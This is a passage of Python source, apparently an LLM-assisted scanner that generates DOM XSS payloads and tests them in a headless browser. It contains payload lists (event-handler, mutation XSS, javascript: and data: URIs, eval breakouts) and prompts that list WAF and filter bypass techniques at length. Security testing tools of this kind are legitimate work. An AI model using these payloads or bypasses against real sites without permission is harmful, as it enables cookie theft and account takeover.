        hash_payloads = [
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '<script>alert(1)</script>',
            '<iframe src="javascript:alert(1)">',
        ]

        for payload in hash_payloads[:3]:  # Limit to top 3
            payloads.append({
                'source': 'location.hash',
                'parameter': None,
                'payload': payload,
                'sink': 'innerHTML',
                'reasoning': 'Hash-based injection for document.write or innerHTML',
                'test_url_pattern': 'append_hash'
            })

        # === MUTATION XSS (mXSS) ===
        mxss_payloads = [
            '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
            '<listing><img src=x onerror=alert(1)></listing>',
            '<style><img src=x onerror=alert(1)></style>',
            '<form><button formaction="javascript:alert(1)">X',
            '<svg><style><img src=x onerror=alert(1)></style></svg>',
        ]

        for payload in mxss_payloads:
            for param in param_names[:1]:
                payloads.append({
                    'source': 'location.search',
                    'parameter': param,
                    'payload': payload,
                    'sink': 'innerHTML',
                    'reasoning': 'Mutation XSS (mXSS) technique',
                    'test_url_pattern': 'query_param'
                })

        # === NO QUOTES NEEDED ===
        no_quotes = [
            '<img src=x onerror=alert(1)>',
            '<svg onload=alert(1)>',
            '<iframe onload=alert(1)>',
            '<body onload=alert(1)>',
        ]

        for payload in no_quotes:
            for param in param_names[:1]:
                payloads.append({
                    'source': 'location.search',
                    'parameter': param,
                    'payload': payload,
                    'sink': 'innerHTML',
                    'reasoning': 'No quotes required - bypasses quote filtering',
                    'test_url_pattern': 'query_param'
                })

        self.logger.info(f"Generated {len(payloads)} comprehensive XSS payloads from database")
        return payloads

    def _encoding_bypass_templates(self, analysis: Dict) -> List[Dict]:
        """
        Template-based encoding bypass payloads when LLM refinement fails
        """
        param_names = [p['name'] for p in analysis.get('parameters', [])]
        if not param_names:
            param_names = ['name', 'search', 'query']

        vectors = []
        detected_sinks = [s['sink_type'] for s in analysis.get('sinks', [])]

        # Prioritize location.href bypass techniques if that sink is detected
        if 'location.href' in detected_sinks or 'location.assign' in detected_sinks:
            for param in param_names:
                # JavaScript protocol with multi-line comment (proven working)
                vectors.append({
                    'source': 'location.search',
                    'parameter': param,
                    'payload': 'javascript:alert(document.cookie)/*https://*/',
                    'sink': 'location.href',
                    'reasoning': 'JavaScript multi-line comment bypasses https:// validation',
                    'test_url_pattern': 'query_param'
                })
                # JavaScript protocol with single-line comment
                vectors.append({
                    'source': 'location.search',
                    'parameter': param,
                    'payload': 'javascript:alert(document.domain)//https://',
                    'sink': 'location.href',
                    'reasoning': 'JavaScript single-line comment bypasses https:// validation',
                    'test_url_pattern': 'query_param'
                })
                # Simple version with comment
                vectors.append({
                    'source': 'location.search',
                    'parameter': param,
                    'payload': 'javascript:alert(1);//https://',
                    'sink': 'location.href',
                    'reasoning': 'JavaScript comment hides required string',
                    'test_url_pattern': 'query_param'
                })
                # Data URI with https:// embedded
                vectors.append({
                    'source': 'location.search',
                    'parameter': param,
                    'payload': 'data:text/html,<script>alert(document.cookie)</script><!--https://-->',
                    'sink': 'location.href',
                    'reasoning': 'Data URI with required string in HTML comment',
                    'test_url_pattern': 'query_param'
                })

        # encodeURI bypass techniques for eval sinks (add after location.href)
        if 'eval' in detected_sinks or not vectors:
            for param in param_names:
                # Single quote string breakout (encodeURI doesn't encode ')
                vectors.append({
                    'source': 'location.search',
                    'parameter': param,
                    'payload': '\';alert(1);//',
                    'sink': 'eval',
                    'reasoning': 'encodeURI bypass with single quote string breakout',
                    'test_url_pattern': 'query_param'
                })
                # Semicolon based (encodeURI doesn't encode ;)
                vectors.append({
                    'source': 'location.search',
                    'parameter': param,
                    'payload': '\' onerror=alert(1) x=\'',
                    'sink': 'eval',
                    'reasoning': 'Attribute injection using unencoded quotes',
                    'test_url_pattern': 'query_param'
                })
                # Plus for string concatenation
                vectors.append({
                    'source': 'location.search',
                    'parameter': param,
                    'payload': '\'+alert(1)+\'',
                    'sink': 'eval',
                    'reasoning': 'String concatenation bypass',
                    'test_url_pattern': 'query_param'
                })

        return vectors

    async def _capture_page_context(self, target_url: str, proxy_agent=None) -> Dict[str, Any]:
        """
        Capture detailed page context for LLM analysis
        """
        context = {
            'javascript_code': [],
            'encoding_functions': [],
            'sanitization_patterns': [],
            'page_title': '',
            'errors': []
        }

        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)
            context_options = {}
            if proxy_agent and proxy_agent.running:
                context_options['proxy'] = {'server': proxy_agent.get_proxy_url()}

            browser_context = await browser.new_context(**context_options)
            page = await browser_context.new_page()

            # Capture console errors
            def handle_console(msg):
                if msg.type == 'error':
                    context['errors'].append(msg.text[:200])

            page.on('console', handle_console)

            try:
                await page.goto(target_url, wait_until='domcontentloaded', timeout=30000)
                await page.wait_for_timeout(2000)

                # Get page title
                context['page_title'] = await page.title()

                # Get all JavaScript code
                scripts = await page.evaluate("""
                    Array.from(document.scripts)
                        .filter(s => !s.src && s.textContent)
                        .map(s => s.textContent)
                """)
                context['javascript_code'] = scripts

                # Detect encoding/sanitization functions
                all_js = '\n'.join(scripts)
                encoding_patterns = [
                    ('encodeURI', r'encodeURI\s*\('),
                    ('encodeURIComponent', r'encodeURIComponent\s*\('),
                    ('escape', r'escape\s*\('),
                    ('DOMPurify', r'DOMPurify'),
                    ('sanitize', r'sanitize\s*\('),
                    ('htmlspecialchars', r'htmlspecialchars'),
                ]

                for name, pattern in encoding_patterns:
                    if re.search(pattern, all_js):
                        context['encoding_functions'].append(name)

            except Exception as e:
                self.logger.error(f"Error capturing page context: {e}")
            finally:
                await browser.close()

        return context

    def _build_adaptive_refinement_prompt(
        self,
        target_url: str,
        analysis: Dict,
        failed_vectors: List[Dict],
        page_context: Dict,
        adaptive_history: List[Dict],
        iteration: int
    ) -> str:
        """
        Build adaptive refinement prompt that learns from actual response analysis
        """
        # Extract response learnings from history
        learnings = []
        delivery_method_failures = {}  # Track failures by delivery method

        for entry in adaptive_history[-10:]:  # Last 10 attempts
            # Track delivery method failures
            method = entry.get('test_url_pattern', 'query_param')
            delivery_method_failures[method] = delivery_method_failures.get(method, 0) + 1

            if 'response_analysis' in entry:
                ra = entry['response_analysis']
                learnings.append({
                    'payload': entry['payload'],
                    'delivery_method': method,
                    'what_happened': ra['summary'],
                    'encoding': ra.get('encoding_detected', []),
                    'filtering': ra.get('filtering_detected', []),
                    'context': ra.get('context', '')[:200] if ra.get('context') else None
                })

        # Analyze delivery method pattern
        delivery_analysis = self._analyze_delivery_methods(delivery_method_failures, iteration)

        prompt = f"""
You are an expert penetration tester performing ADAPTIVE DOM XSS testing with advanced WAF bypass techniques.

TARGET: {target_url}

DETECTED SINKS:
{json.dumps(analysis['sinks'], indent=2)}

DISCOVERED PARAMETERS:
{json.dumps([p['name'] for p in analysis.get('parameters', [])], indent=2)}

JAVASCRIPT CODE ON PAGE:
```javascript
{chr(10).join(page_context.get('javascript_code', []))[:1500]}
```

ADAPTIVE LEARNING FROM PREVIOUS ATTEMPTS:

{self._format_adaptive_learnings(learnings)}

{delivery_analysis}

ITERATION: {iteration + 1}/5

=== CRITICAL: ANALYZE WHAT WE LEARNED ===

From the response analysis above, identify:
1. Which keywords are blocked? (script, alert, onerror, onload, etc.)
2. Which characters are stripped? (<, >, ", ', etc.)
3. Is HTML encoding applied?
4. Is the payload removed entirely or just modified?

=== ADVANCED BYPASS TECHNIQUES ===

**If 'alert' keyword is blocked:**
- Use alternatives: prompt(1), confirm(1), console.log(1)
- Character encoding: \\u0061lert(1), \\x61lert(1)
- String concatenation: window['al'+'ert'](1)
- String.fromCharCode: eval(String.fromCharCode(97,108,101,114,116,40,49,41))
- Template literals: eval(`${{}}alert(1)`)
- Top-level access: top['alert'](1), self['alert'](1), parent['alert'](1)
- Property access: window[atob('YWxlcnQ=')](1)

**If 'script' keyword is blocked:**
- Break with null bytes: <scri\\x00pt>
- Break with comments: <scr<!---->ipt>
- Unicode variants: <\\u0073cript>
- Alternative tags: <svg>, <iframe>, <img>, <input>, <body>, <details>
- No-tag approaches: Use existing elements with event handlers

**If angle brackets < > are blocked:**
- Use existing HTML elements on page
- Try context-specific injection (already inside a tag attribute)
- Use encoded variants: &lt; &gt; \\x3c \\x3e
- Try newlines/tabs between characters

**If quotes are blocked (both ' and "):**
- Use backticks: `payload`
- Use String.fromCharCode: String.fromCharCode(88,83,83)
- Use no quotes: throw/onerror=alert,1// (for event handlers)
- Use encoded quotes: \\x22 \\x27 \\u0022 \\u0027

**If event handlers are blocked (onerror, onload, onclick, etc.):**
- Try less common events:
  - ontoggle (with <details>)
  - onpointerenter, onpointerover
  - onanimationstart, onanimationend
  - ontransitionend
  - onfocusin, onfocusout
  - onpageshow, onpagehide
  - onbeforeprint, onafterprint
- Use event handler obfuscation: on\\x65rror, on\\u0065rror

**For innerHTML sinks with heavy filtering:**
- Try mutation XSS: <noscript><p title="</noscript><img src=x onerror=alert(1)>">
- Use mXSS with namespace confusion
- Try double encoding if server decodes twice
- Use HTML entity encoding: &lt;img src=x onerror=alert(1)&gt; (then break context)

**For eval/Function sinks:**
- Break out of string context: '); alert(1);//
- Use newlines to break validation: \\n\\ralert(1)//
- Prototype pollution to bypass: constructor[constructor]
- Template injection: ${{alert(1)}}

**For location.href sinks:**
- javascript: protocol with obfuscation: javas\\x63ript:alert(1)
- data: URI: data:text/html,<script>alert(1)</script>
- Bypass validation with comments: javascript:alert(1)//https://
- Case variation: JaVaScRiPt:alert(1)
- Null bytes: javascript:\\x00alert(1)

**Hash + Query Parameter Hybrid (for high security WAFs):**
- If hash alone doesn't work: #?param=payload (combines fragment with query)
- If query alone doesn't work: ?#param=payload (try reversed order)
- Double delimiter: ##payload or ??payload
- Mixed delimiters: #?#payload or ?#?payload
- Fragment with fake query: #default=value&xss=payload
- This bypasses filters that check EITHER hash OR query, but not combinations

**General obfuscation techniques:**
- Unicode escaping: \\u0061lert(1)
- Hex escaping: \\x61lert(1)
- Octal escaping: \\141lert(1)
- HTML entities: &colon;alert(1) for :
- URL encoding: %61lert(1)
- Double URL encoding: %2561lert(1)
- Mixed case: AlErT(1), OnErRoR
- Comment insertion: al/**/ert(1), on/**/error
- Whitespace alternatives: \\t\\r\\n\\f\\v
- Zero-width characters: al​ert(1) (with zero-width space)

**Context-aware exploitation:**
- If payload appears in <script> tag: Direct JavaScript execution
- If in HTML attribute: Break out with " or ' then inject event handler
- If in HTML body: Inject new HTML tags with event handlers
- If URL-encoded in response: Double-encode your payload
- If inside JavaScript string: Use string breakout then code injection

=== STEP-BY-STEP BYPASS STRATEGY ===

1. **Identify blocked elements**: From learnings, list exact keywords/characters blocked
2. **Analyze delivery method failures**: Check which test_url_patterns have failed
3. **Choose alternative delivery method**: If query_param failed, try hash or hybrid
4. **Choose alternative payload**: Pick technique that avoids ALL blocked elements
5. **Test complexity gradually**: Start simple, add obfuscation only if needed
6. **Mix techniques**: Combine multiple bypass methods AND delivery methods
7. **Match the sink**: Ensure payload makes sense for detected sink type

=== DELIVERY METHOD OPTIONS (test_url_pattern) ===

**Available delivery methods:**
- "query_param": Standard query string (?param=payload) - Often filtered in high security
- "append_hash": URL fragment (#payload) - Bypasses server-side filters
- "hybrid_hash_query": Hybrid (#?param=payload) - Bypasses filters that check only one method
- "hybrid_query_hash": Reverse hybrid (?param=value#fragment) - Alternative combination

**CRITICAL RULE**: If the delivery analysis shows one method has failed repeatedly (5+ times),
you MUST try a DIFFERENT test_url_pattern! Don't keep using the same failed method!

=== RESPONSE FORMAT ===

**CRITICAL: You MUST respond with ONLY a valid JSON array. No explanatory text before or after.**
**Do NOT include analysis, explanations, or markdown. ONLY the JSON array.**

Generate payloads that explicitly avoid the blocked elements AND try different delivery methods.

[
  {{
    "source": "location.search",
    "parameter": "search",
    "payload": "SPECIFIC_BYPASS_AVOIDING_BLOCKED_ELEMENTS",
    "sink": "innerHTML",
    "reasoning": "Learnings show [X] is blocked. This payload uses [Y] instead, which bypasses because [Z]",
    "test_url_pattern": "query_param",
    "bypass_technique": "Detailed explanation with reference to specific blocked elements and how we avoid them"
  }}
]

=== REQUIREMENTS ===

- Generate 5 COMPLETELY DIFFERENT payloads
- **CRITICAL: Try DIFFERENT test_url_patterns!** If query_param failed, use append_hash or hybrid!
- Each payload must use a DIFFERENT bypass technique
- Explicitly avoid keywords/characters that were stripped in previous attempts
- Reference the specific learnings and delivery method analysis in your reasoning
- Be creative and think outside common XSS patterns
- Consider the exact sink type when crafting payloads
- **If the delivery analysis shows a method failing repeatedly, DO NOT use that method again!**
- **RESPOND WITH ONLY JSON - NO OTHER TEXT**
"""

        return prompt

    def _analyze_delivery_methods(self, delivery_failures: Dict[str, int], iteration: int) -> str:
        """
        Analyze which delivery methods have been tried and suggest alternatives
        """
        if not delivery_failures:
            return "No delivery methods tried yet."

        total_attempts = sum(delivery_failures.values())
        analysis = ["=== DELIVERY METHOD ANALYSIS ===\n"]

        for method, count in sorted(delivery_failures.items(), key=lambda x: x[1], reverse=True):
            percentage = (count / total_attempts) * 100
            analysis.append(f"  - {method}: {count} failures ({percentage:.0f}% of attempts)")

        # Determine what methods to try next
        tried_methods = set(delivery_failures.keys())
        all_methods = {'query_param', 'append_hash', 'hybrid_hash_query', 'hybrid_query_hash'}
        untried_methods = all_methods - tried_methods

        if 'query_param' in delivery_failures and delivery_failures['query_param'] >= 5:
            analysis.append("\n⚠️ CRITICAL: Query parameters failing repeatedly!")
            analysis.append("   → HIGH PRIORITY: Try alternative delivery methods")

            if untried_methods:
                analysis.append(f"   → Untried methods: {', '.join(untried_methods)}")
                analysis.append("   → RECOMMENDATION: Switch to hash-based or hybrid delivery")
            else:
                analysis.append("   → All basic methods tried. Try creative combinations.")

        if iteration >= 2 and len(tried_methods) == 1:
            only_method = list(tried_methods)[0]
            analysis.append(f"\n⚠️ WARNING: Only using '{only_method}' delivery method!")
            analysis.append(f"   → You MUST try different delivery methods: {', '.join(untried_methods)}")

        return "\n".join(analysis)

    def _format_adaptive_learnings(self, learnings: List[Dict]) -> str:
        """Format the adaptive learning data for the prompt"""
        if not learnings:
            return "No previous attempts yet - this is the first iteration."

        formatted = []
        for i, learn in enumerate(learnings, 1):
            formatted.append(f"""
Attempt {i}:
  Payload sent: {learn['payload']}
  Delivery method: {learn.get('delivery_method', 'unknown')}
  What happened: {learn['what_happened']}
  Encoding detected: {', '.join(learn['encoding']) if learn['encoding'] else 'None'}
  Filtering detected: {', '.join(learn['filtering']) if learn['filtering'] else 'None'}
  Context in response: {learn['context'] if learn['context'] else 'Not found in response'}
""")

        return "\n".join(formatted)

    def _build_refinement_prompt(
        self,
        target_url: str,
        analysis: Dict,
        failed_vectors: List[Dict],
        page_context: Dict,
        history: List[Dict],
        iteration: int
    ) -> str:
        """
        Build detailed prompt for LLM refinement
        """
        prompt = f"""
You are an expert penetration tester specializing in DOM XSS exploitation and encoding bypasses.

TARGET: {target_url}
PAGE TITLE: {page_context.get('page_title', 'Unknown')}

DETECTED SINKS:
{json.dumps(analysis['sinks'], indent=2)}

DISCOVERED PARAMETERS:
{json.dumps([p['name'] for p in analysis.get('parameters', [])], indent=2)}

JAVASCRIPT CODE ON PAGE:
```javascript
{chr(10).join(page_context.get('javascript_code', []))[:1500]}
```

ENCODING/SANITIZATION DETECTED:
{', '.join(page_context['encoding_functions']) if page_context['encoding_functions'] else 'None detected'}

STANDARD PAYLOADS THAT FAILED:
{json.dumps([{'payload': v.get('payload'), 'sink': v.get('sink')} for v in failed_vectors[:5]], indent=2)}

{'PREVIOUS REFINEMENT ATTEMPTS:' if history else ''}
{json.dumps(history, indent=2) if history else ''}

ITERATION: {iteration + 1}

TASK: Analyze the JavaScript code and encoding functions to understand why standard payloads failed.
Then generate NEW, CREATIVE payloads that bypass the specific protections in place.

ANALYSIS QUESTIONS:
1. What encoding function is being used? (encodeURI, encodeURIComponent, etc.)
2. What characters does it encode and what does it NOT encode?
3. What is the exact JavaScript context where user input is used?
4. Is it string concatenation in eval, assignment to innerHTML, or something else?
5. What bypass techniques can work?

BYPASS TECHNIQUES TO CONSIDER:
- encodeURI() doesn't encode: ~ ! @ # $ & * ( ) = : / ; ? + '
- encodeURIComponent() encodes more but still allows: ~ ! * ( ) '
- For eval string contexts: Break out with quotes, use string concatenation
- For HTML contexts: Use unencoded characters to create event handlers
- Newlines, tabs, and special whitespace might not be encoded
- Use alternative event handlers: onerror, onload, onfocus, etc.
- Try breaking out of attribute contexts

RESPONSE FORMAT (JSON array):
[
  {{
    "source": "location.search",
    "parameter": "name",
    "payload": "EXACT_PAYLOAD_HERE",
    "sink": "eval",
    "reasoning": "DETAILED explanation of why THIS specific payload should bypass the protections",
    "test_url_pattern": "query_param",
    "bypass_technique": "Description of the bypass technique used"
  }}
]

Generate 3-5 DIFFERENT payloads, each trying a DIFFERENT bypass approach.
Be CREATIVE and think outside the box. Consider the EXACT encoding behavior.
"""

        return prompt

    async def _ai_generate_vectors(self, target_url: str, analysis: Dict) -> List[Dict]:
        """
        Use AI to generate intelligent DOM XSS test vectors
        """
        # Extract discovered parameter names
        discovered_params = analysis.get('parameters', [])
        param_list = [p['name'] for p in discovered_params]

        prompt = f"""
You are a security testing expert analyzing a web application for DOM-based XSS vulnerabilities.

TARGET URL: {target_url}

DETECTED SOURCES (user-controllable input):
{json.dumps(analysis['sources'], indent=2)}

DETECTED SINKS (dangerous operations):
{json.dumps(analysis['sinks'], indent=2)}

DISCOVERED PARAMETERS (extracted from forms and JavaScript):
{json.dumps(param_list, indent=2)}

DETECTED FRAMEWORKS:
{', '.join(analysis['frameworks']) if analysis['frameworks'] else 'None detected'}

TASK: Generate specific DOM XSS test vectors that exploit the data flow from detected sources to sinks.

For each source-sink combination, generate:
1. The source to target (location.hash, location.search, etc.)
2. The payload to inject via that source
3. The expected sink where it should execute
4. Why this vector should work

CRITICAL RULES:
- ALWAYS use the discovered parameter names from the DISCOVERED PARAMETERS list above
- For location.search vectors, use the EXACT parameter names discovered (e.g., if "search" was discovered, use "search" not generic names)
- location.hash payloads: Use #payload (fragment after #)
- location.search payloads: Use ?param=payload where param is from DISCOVERED PARAMETERS
- Target the SPECIFIC sinks that were detected
- Create payloads that will trigger those exact sinks
- Consider framework-specific bypasses if frameworks detected

PAYLOAD STRATEGY BY SINK TYPE:
- For eval/Function/setTimeout sinks: Use JavaScript string breakout payloads like: '); alert(1);// or ' onerror=alert(1)//
  These break out of the string context to inject code
- For innerHTML/outerHTML sinks: Use HTML injection payloads like: <img src=x onerror=alert()> or <svg onload=alert()>
  These inject HTML tags with event handlers
- For document.write sinks: Use <script> tags or HTML with event handlers
- Consider encoding bypasses: encodeURI doesn't encode single quotes, so use ' for string breakouts

RESPONSE FORMAT (JSON array):
[
  {{
    "source": "location.search",
    "parameter": "search",
    "payload": "<img src=x onerror=alert('DOM-XSS')>",
    "sink": "innerHTML",
    "reasoning": "The discovered parameter 'search' is read from location.search and assigned to innerHTML without sanitization",
    "test_url_pattern": "query_param"
  }},
  {{
    "source": "location.hash",
    "parameter": null,
    "payload": "<svg onload=alert('DOM-XSS')>",
    "sink": "innerHTML",
    "reasoning": "The page reads location.hash and assigns it to innerHTML",
    "test_url_pattern": "append_hash"
  }}
]

Generate 3-5 most promising vectors. PRIORITIZE vectors using discovered parameters over generic ones.
"""

        try:
            from ..llm_client import get_default_model
            response = self.ai_client.simple_chat(
                model=get_default_model(),
                message=prompt,
                temperature=0.7
            )

            # Parse JSON response
            cleaned_response = self._clean_json_response(response)
            vectors = json.loads(cleaned_response)

            self.logger.info(f"AI generated {len(vectors)} DOM XSS test vectors")
            return vectors

        except Exception as e:
            self.logger.error(f"AI vector generation failed: {e}, falling back to templates")
            return self._template_based_vectors(target_url, analysis)

    def _template_based_vectors(self, target_url: str, analysis: Dict) -> List[Dict]:
        """
        Fallback template-based vector generation
        """
        vectors = []

        # Detect what sinks are present
        detected_sinks = [s['sink_type'] for s in analysis.get('sinks', [])]
        has_document_write = 'document.write' in detected_sinks
        has_eval = 'eval' in detected_sinks
        has_innerHTML = 'innerHTML' in detected_sinks

        # Get discovered parameters
        discovered_params = analysis.get('parameters', [])
        param_names = [p['name'] for p in discovered_params if p.get('type') == 'url_parameter']

        # If no params discovered, use common defaults
        if not param_names:
            param_names = ['q', 'search', 'query', 'data', 'input']

        # Common DOM XSS vectors - test regardless of source detection
        # because sources like location.hash might not be accessed until payload is injected
        common_vectors = [
            {
                'source': 'location.hash',
                'parameter': None,
                'payload': '<img src=x onerror=alert("DOM-XSS")>',
                'sink': 'document.write',
                'reasoning': 'Hash-based document.write injection',
                'test_url_pattern': 'append_hash'
            },
            {
                'source': 'location.hash',
                'parameter': None,
                'payload': '<script>alert("DOM-XSS")</script>',
                'sink': 'document.write',
                'reasoning': 'Hash-based script injection via document.write',
                'test_url_pattern': 'append_hash'
            },
            {
                'source': 'location.search',
                'parameter': 'default',
                'payload': '<img src=x onerror=alert("DOM-XSS")>',
                'sink': 'document.write',
                'reasoning': 'Query parameter to document.write',
                'test_url_pattern': 'query_param'
            },
            {
                'source': 'location.search',
                'parameter': 'callback',
                'payload': 'alert(1)',
                'sink': 'eval',
                'reasoning': 'JSONP callback to eval',
                'test_url_pattern': 'query_param'
            },
            {
                'source': 'location.hash',
                'parameter': None,
                'payload': '<svg onload=alert("DOM-XSS")>',
                'sink': 'innerHTML',
                'reasoning': 'Hash-based SVG innerHTML injection',
                'test_url_pattern': 'append_hash'
            },
        ]

        # Add eval-specific vectors if detected
        if has_eval:
            # Test each discovered parameter with string breakout payloads
            for param in param_names:
                vectors.append({
                    'source': 'location.search',
                    'parameter': param,
                    'payload': '\'); alert(\"DOM-XSS\");//',
                    'sink': 'eval',
                    'reasoning': f'Discovered parameter "{param}" to eval - string breakout',
                    'test_url_pattern': 'query_param'
                })
                vectors.append({
                    'source': 'location.search',
                    'parameter': param,
                    'payload': '\' onerror=alert(\"DOM-XSS\") //',
                    'sink': 'eval',
                    'reasoning': f'Discovered parameter "{param}" to eval - attribute injection',
                    'test_url_pattern': 'query_param'
                })

        # Add innerHTML-specific vectors if detected
        if has_innerHTML:
            # Test each discovered parameter
            for param in param_names:
                vectors.append({
                    'source': 'location.search',
                    'parameter': param,
                    'payload': '<img src=x onerror=alert("DOM-XSS")>',
                    'sink': 'innerHTML',
                    'reasoning': f'Discovered parameter "{param}" to innerHTML',
                    'test_url_pattern': 'query_param'
                })

            # Also test hash-based
            vectors.append({
                'source': 'location.hash',
                'parameter': None,
                'payload': '<svg onload=alert("DOM-XSS")>',
                'sink': 'innerHTML',
                'reasoning': 'Hash-based SVG innerHTML injection',
                'test_url_pattern': 'append_hash'
            })

        # If specific sinks detected, prioritize matching vectors
        if has_document_write:
            doc_write_vectors = [v for v in common_vectors if v['sink'] == 'document.write']
            vectors.extend(doc_write_vectors)

        if has_eval:
            eval_vectors = [v for v in common_vectors if v['sink'] == 'eval']
            vectors.extend(eval_vectors)

        if not vectors:
            # Test all if nothing specific detected
            vectors = common_vectors

        return vectors[:5]  # Return top 5

    async def _test_dom_vector_with_analysis(self, target_url: str, vector: Dict, proxy_agent=None):
        """
        Test a vector AND analyze the response to understand what happened
        Returns: (vulnerability or None, response_analysis dict)
        """
        # Build test URL
        test_url = self._build_test_url(target_url, vector)

        response_analysis = {
            'payload_sent': vector['payload'],
            'test_url': test_url,
            'payload_found_in_response': False,
            'payload_transformation': None,
            'encoding_detected': [],
            'filtering_detected': [],
            'context': None,
            'summary': ''
        }

        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)

            context_options = {}
            if proxy_agent and proxy_agent.running:
                context_options['proxy'] = {'server': proxy_agent.get_proxy_url()}

            context = await browser.new_context(**context_options)
            page = await context.new_page()

            try:
                await page.goto(test_url, wait_until='networkidle', timeout=30000)
                await page.wait_for_timeout(2000)

                # Capture the response HTML
                response_html = await page.content()

                # Analyze what happened to our payload
                payload = vector['payload']

                # Check if payload exists in any form
                if payload in response_html:
                    response_analysis['payload_found_in_response'] = True
                    response_analysis['payload_transformation'] = 'unchanged'
                    response_analysis['context'] = self._extract_payload_context(response_html, payload)
                else:
                    # Check for common transformations
                    import html as html_module

                    # HTML encoding
                    html_encoded = html_module.escape(payload)
                    if html_encoded in response_html:
                        response_analysis['payload_found_in_response'] = True
                        response_analysis['payload_transformation'] = 'html_encoded'
                        response_analysis['encoding_detected'].append('HTML entities')
                        response_analysis['summary'] = f"Payload was HTML-encoded: {payload} → {html_encoded}"

                    # URL encoding
                    from urllib.parse import quote
                    url_encoded = quote(payload)
                    if url_encoded in response_html:
                        response_analysis['payload_found_in_response'] = True
                        response_analysis['payload_transformation'] = 'url_encoded'
                        response_analysis['encoding_detected'].append('URL encoding')
                        response_analysis['summary'] = f"Payload was URL-encoded: {payload} → {url_encoded}"

                    # Check if stripped/removed
                    dangerous_chars = ['<', '>', '"', "'", 'script', 'alert', 'onerror', 'onload']
                    found_chars = [char for char in dangerous_chars if char.lower() in payload.lower()]

                    if found_chars:
                        # Check if these chars appear elsewhere in response
                        chars_found_elsewhere = any(char in response_html for char in found_chars)
                        if not chars_found_elsewhere:
                            response_analysis['filtering_detected'].append('Dangerous characters stripped')
                            response_analysis['summary'] = f"Dangerous characters removed: {', '.join(found_chars)}"
                        else:
                            response_analysis['filtering_detected'].append('Payload completely removed')
                            response_analysis['summary'] = "Entire payload was stripped from response"

                if not response_analysis['summary']:
                    response_analysis['summary'] = "Payload not found in response - may be blocked or redirected"

            except Exception as e:
                response_analysis['summary'] = f"Error during test: {str(e)}"
            finally:
                await browser.close()

        # Now do the regular test for vulnerability
        vuln = await self._test_dom_vector(target_url, vector, proxy_agent)

        return vuln, response_analysis

    def _extract_payload_context(self, html: str, payload: str, context_size: int = 100) -> str:
        """Extract surrounding context where payload appears in HTML"""
        try:
            idx = html.find(payload)
            if idx == -1:
                return ""

            start = max(0, idx - context_size)
            end = min(len(html), idx + len(payload) + context_size)

            context = html[start:end]
            # Mark the payload
            context = context.replace(payload, f"<<<{payload}>>>")

            return context
        except:
            return ""

    async def _test_dom_vector(self, target_url: str, vector: Dict, proxy_agent=None) -> Optional[DOMXSSVulnerability]:
        """
        Test a specific DOM XSS vector
        """
        # Build test URL based on vector
        test_url = self._build_test_url(target_url, vector)

        self.logger.info(f"Testing: {test_url}")

        async with async_playwright() as p:
            browser = await p.chromium.launch(headless=True)

            context_options = {}
            if proxy_agent and proxy_agent.running:
                context_options['proxy'] = {'server': proxy_agent.get_proxy_url()}

            context = await browser.new_context(**context_options)
            page = await context.new_page()

            # Track execution
            alerts_caught = []
            console_logs = []
            executed = False
            payload_in_alert = False

            # Monitor dialogs
            async def handle_dialog(dialog):
                nonlocal executed, payload_in_alert
                alert_msg = dialog.message
                alerts_caught.append(alert_msg)

                # Check if this alert is related to our payload
                # Look for our unique marker 'DOM-XSS' or check if alert matches expected value
                payload_indicators = ['DOM-XSS', 'XSS', vector['payload']]
                if any(indicator in str(alert_msg) for indicator in payload_indicators):
                    executed = True
                    payload_in_alert = True
                    self.logger.info(f"Alert captured (payload-related): {alert_msg}")
                else:
                    # Alert not from our payload - might be from page itself
                    self.logger.debug(f"Alert captured (unrelated to payload): {alert_msg}")

                await dialog.accept()

            page.on("dialog", handle_dialog)

            # Monitor console
            def handle_console(msg: ConsoleMessage):
                # Only capture relevant console messages (errors, XSS indicators)
                if msg.type == 'error' or 'DOM-XSS' in msg.text or 'xss' in msg.text.lower():
                    console_logs.append({
                        'type': msg.type,
                        'text': msg.text
                    })
                    # Check for XSS indicators
                    if 'DOM-XSS' in msg.text or 'xss' in msg.text.lower():
                        nonlocal executed
                        executed = True

            page.on("console", handle_console)

            # Inject sink monitor
            await page.add_init_script(self._get_sink_monitor_script())

            try:
                # Navigate with payload
                await page.goto(test_url, wait_until='networkidle', timeout=30000)
                await page.wait_for_timeout(2000)

                # Try to trigger DOM XSS by clicking buttons/submitting forms
                try:
                    # Look for submit buttons
                    buttons = await page.query_selector_all('button, input[type="submit"], input[type="button"]')
                    for button in buttons[:3]:  # Try first 3 buttons
                        try:
                            await button.click(timeout=1000)
                            await page.wait_for_timeout(1000)
                        except:
                            pass
                except:
                    pass

                # Check if sinks were triggered
                triggered_sinks = await page.evaluate('window.__xss_sinks__ || []')

                # Check if our payload reached a sink
                payload_in_sink = False
                for sink in triggered_sinks:
                    if vector['payload'] in str(sink.get('value', '')):
                        payload_in_sink = True
                        break

                # For all sinks, we need actual execution proof (alert)
                # Just reaching the sink is not enough - we need to verify the payload executed
                if payload_in_sink and not executed:
                    # Payload reached sink but no alert = likely:
                    # - Encoded/sanitized
                    # - Open redirect (for location.href) but not XSS
                    # - Blocked by browser (Mixed Content, CSP, etc.)
                    self.logger.debug(f"Payload reached sink but no execution detected - possible encoding/sanitization or redirect without XSS")

                # Take screenshot
                timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
                screenshot_dir = Path("screenshots")
                screenshot_dir.mkdir(exist_ok=True)
                screenshot_path = screenshot_dir / f"dom_xss_{timestamp}.png"
                await page.screenshot(path=str(screenshot_path), full_page=True)

                # Only report vulnerability if we have actual execution proof
                # Requirements:
                # 1. Alert was fired AND related to our payload
                # 2. Payload reached a sink OR we have strong evidence from alert
                if executed and payload_in_alert and (payload_in_sink or alerts_caught):
                    # Build comprehensive evidence
                    evidence = []

                    # Add alert messages
                    if alerts_caught:
                        evidence.append(f"✓ Alert fired: {', '.join(alerts_caught)}")

                    # Add sink detection
                    if triggered_sinks:
                        evidence.append(f"✓ Payload reached {len(triggered_sinks)} sink(s)")

                    # Add console messages (excluding generic resource errors)
                    relevant_logs = [
                        log['text'] for log in console_logs
                        if 'DOM-XSS' in log['text'] or 'XSS' in log['text']
                    ]
                    if relevant_logs:
                        evidence.extend(relevant_logs)

                    # If no specific evidence but execution confirmed, add generic message
                    if not evidence:
                        evidence.append("✓ XSS executed (alert dialog caught)")

